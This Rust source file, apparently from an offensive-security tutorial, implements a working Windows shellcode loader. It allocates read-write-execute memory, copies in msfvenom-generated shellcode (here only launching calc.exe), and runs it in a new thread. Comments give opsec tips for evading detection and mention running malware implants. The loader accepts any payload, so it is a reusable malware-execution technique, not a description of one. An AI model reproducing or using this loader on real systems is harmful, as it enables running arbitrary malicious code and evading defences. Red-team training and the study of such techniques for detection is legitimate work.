// Specify that we want to use the 'winapi' crate, which provides Rust bindings to Windows APIs
// It is good practice to further specify the imports for each API type that we want to use to limit clutter in our code
// In this case, we only specify the crate itself as an import, and specify the types we want to use later on
// This makes it a bit easier to recognize where our functions are coming from
use windows_sys; 
use std::{ffi::c_void, ptr}; // Some pointer functions and a type we will need

// Define our inject_local function, which takes a reference to our shellcode as an argument
// Note the use of `&`, denoting a reference to the shellcode rather than a copy (#JustRustThings)
// On rust ownership: https://doc.rust-lang.org/book/ch04-01-what-is-ownership.html
fn inject_local(shellcode: &[u8]) {
    // In this example, we use VirtualAlloc() to allocate memory for our shellcode and copy it
    // An equally suitable alternative would be to make our shellcode executable directly using VirtualProtect()

    // We need to specify that this part is 'unsafe', to tell Rust we're okay with managing memory directly
    unsafe {
        // Allocate RWX (read-write-execute) memory to execute the shellcode from
        // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode
        let executable_memory = windows_sys::Win32::System::Memory::VirtualAlloc(
            ptr::null_mut(), // Address to start allocation from. Null means 'anywhere'
            shellcode.len(), // Size of allocation
            windows_sys::Win32::System::Memory::MEM_COMMIT
                | windows_sys::Win32::System::Memory::MEM_RESERVE, // Allocate memory immediately
            windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE, // Memory protection flags
        );

        // Copy the shellcode into our assigned region of RWX memory
        std::ptr::copy(
            shellcode.as_ptr(),
            // Here we 'cast' the type of our pointer from "*mut c_void" to "*mut u8", as required by the copy function
            executable_memory as *mut u8,
            shellcode.len(),
        );

        // Create a thread at the start of the executable shellcode to run it!
        // We use the 'transmute' function to convert our pointer to a function pointer
        let executable_memory_pointer: extern "system" fn(*mut c_void) -> u32 =
            { std::mem::transmute(executable_memory) };
        let thread_handle = windows_sys::Win32::System::Threading::CreateThread(
            ptr::null_mut(),
            0,
            Some(executable_memory_pointer),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        // Wait for our thread to exit to prevent program from closing before the shellcode ends
        // This is especially relevant for long-running shellcode, such as malware implants
        windows_sys::Win32::System::Threading::WaitForSingleObject(
            thread_handle,
            windows_sys::Win32::System::Threading::INFINITE,
        );

        // Normally Rust is quite good at memory management, but since we are doing unsafe WinAPI stuff we have to clean up after ourselves
        // In this case, we free the memory we allocated earlier and close the thread handle
        windows_sys::Win32::System::Memory::VirtualFree(
            executable_memory,
            0,
            windows_sys::Win32::System::Memory::MEM_RELEASE,
        );
        windows_sys::Win32::Foundation::CloseHandle(thread_handle);
    }
}

// Our main function, required as an entrypoint in Rust
fn main() {
    // Define our shellcode as an array of 'u8' (unsigned 8-bit integers)
    // msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f rust
    let shellcode: [u8; 296] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c,
        0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
        0x32, 0x5c, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    // Call our shellcode
    inject_local(&shellcode);
}
